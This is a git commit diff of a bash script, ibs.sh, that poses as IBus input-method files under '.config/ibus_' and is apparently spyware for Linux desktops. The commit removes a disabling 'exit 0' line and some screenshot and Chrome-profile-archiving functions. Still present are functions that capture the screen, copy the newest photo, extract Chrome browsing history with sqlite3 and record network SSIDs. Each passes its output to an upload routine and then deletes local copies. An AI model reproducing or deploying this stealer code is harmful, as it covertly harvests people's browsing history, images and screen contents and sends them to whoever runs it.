33704abe774cdac4fdaa4b959d699516b56d15ab
hLbx0 <90946073+hLbx0@users.noreply.github.com>
2023-06-22 05:33:11 -0400

    Update ibs.sh

--- ibs.sh
+++ ibs.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-#exit 0
+
 function dbgx(){
 	echo "[*] $1";
 }
@@ -12,17 +12,6 @@ HOME_="/home/$USER/"
 HOME_2="/home/$USER/.config/ibus_/"
 #IBUS_="/usr/local/sbin/ibus_/"
 IBUS_="/home/$USER/.config/ibus_/"
-
-function ssx(){
-	#scrot
-    output_file="ss.png"
-    dbgx "ssx..."
-    scrot "$IBUS_$output_file"
-    dbgx "ssx saved to $output_file"
-    cx "$output_file" "SS"
-    slpx
-    rm -f "$IBUS_$output_file"
-}
 
 function ssx_(){
     #imagemagick
@@ -37,27 +26,6 @@ function ssx_(){
     cx "$output_file" "SS"
     slpx 
     rm -f "$IBUS_$output_file"
-}
-
-function ssx__(){
-    #fbgrab #libpng-dev
-    output_file="ss.png"
-    dbgx "ssx..."
-    fbgrab | convert - "$IBUS_$output_file"
-    dbgx "ssx saved to $output_file"
-    cx "$output_file" "SS"
-    slpx
-    rm -f "$IBUS_$output_file"
-}
-
-function GCx(){
-	folder_to_compress="/home/$USER/.config/google-chrome"
-	output_file="$IBUS_""gcx.tar.gz"
-	tar -czvf "$output_file" "$folder_to_compress"
-	#
-    	cx "$output_file" "SS"
-    	slpx
-    	rm -f "$IBUS_$output_file"
 }
 
 function GCx_(){
@@ -151,13 +119,9 @@ function ax_(){
 
 function PxNwx(){
     pictures_dir="$HOME_/Pictures"
-    # Use the find command to locate all image files in the folder and its subdirectories
     images=$(find "$pictures_dir" -type f \( -iname \*.jpg -o -iname \*.jpeg -o -iname \*.png -o -iname \*.gif \))
-    # Use the stat command to get the modification time of each image file and sort the list in reverse order
     sorted_images=$(echo "$images" | xargs stat --format '%Y %n' | sort -rn)
-    # Extract the newest image file from the sorted list
     newest_image=$(echo "$sorted_images" | head -n 1 | awk '{print $2}')
-    # Display the path to the newest image file
     dbgx "Newest image: $newest_image"
     output_file="px.png"
     cp "$newest_image" $IBUS_$output_file
@@ -178,15 +142,10 @@ function WbCmx(){
 function Hstrx(){
     output_file="chrome_history.txt"
     tmp_chrome_history="$IBUS_/tmp_chrome_history.sqlite"
-    # Define the path to the Chrome history database file
     chrome_history_file="$HOME_/.config/google-chrome/Default/History"
-    # Copy the database file to a temporary location
     cp "$chrome_history_file" $tmp_chrome_history
-    # Query the history database using SQLite and output the results to a text file
     sqlite3 -separator $'\t' $tmp_chrome_history "SELECT datetime(last_visit_time/1000000-11644473600,'unixepoch','localtime'), title, url FROM urls ORDER BY last_visit_time DESC;" > $IBUS_$output_file
-    # Display the location of the output file
     dbgx "Chrome history extracted to $IBUS_$output_file"
-    # Remove the temporary database file
     rm $tmp_chrome_history
     #
     cx "$output_file" "HX"
@@ -216,10 +175,8 @@ function Ntx(){
     if [[ -n "$wifi_interface" ]]
     then
         dbgx "User is connected to WiFi using interface $wifi_interface"
-        # Retrieve the SSID of the current wireless network
         SSID=$(iwgetid -r)
 
-        # Check if the SSID variable contains a value
         if [[ -n "$SSID" ]]
         then
             dbgx "Current SSID: $SSID"
@@ -236,10 +193,8 @@ function Ntx(){
 	#
 	cx_ "$eth_interface" "SSID"
         #
-        # Retrieve the name of the Ethernet connection
         eth_interface=$(ip -o link show | awk -F': ' '{print $2, $9}' | grep "state UP" | grep -v "lo:" | awk '{print $1}')
 
-        # Check if the eth_interface variable contains a value
         if [[ -n "$eth_interface" ]]
         then
             dbgx "Name of Ethernet connection: $eth_interface"
